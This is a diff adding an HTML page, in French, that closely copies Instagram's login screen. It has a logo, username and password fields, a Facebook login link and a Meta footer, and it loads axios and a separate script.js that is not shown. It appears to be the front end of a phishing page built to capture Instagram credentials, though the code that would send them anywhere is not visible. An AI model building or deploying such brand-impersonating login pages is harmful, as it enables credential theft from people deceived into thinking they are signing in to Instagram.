@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="logo">
+    <img src="icon.jpeg" alt="Instagram" class="logo-img">
+  </div>
+
+  <form id="loginForm">
+    <input type="text" id="username" name="username" placeholder="Num. téléphone, nom de profil ou e-mail" required>
+    <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+
+    <button type="submit" class="login-btn">Se connecter</button>
+  </form>
+
+  <div class="divider">
+    <span></span>
+    <p>OU</p>
+    <span></span>
+  </div>
+
+  <div class="facebook">
+    <span>f</span>
+    <a href="#">Se connecter avec Facebook</a>
+  </div>
+
+  <a class="forgot" href="#">Mot de passe oublié ?</a>
+
+</div>
+
+<div class="signup">
+  Vous n'avez pas de compte ?
+  <a href="#">Inscrivez-vous</a>
+</div>
+
+<footer>
+  <p>
+    Meta · À propos · Blog · Emplois · Aide · API · Confidentialité · Conditions
+    <br>
+    Lieux · Instagram Lite · Meta AI · Threads
+  </p>
+</footer>
+
+<script src="script.js"></script>
+
+</body>
+</html>
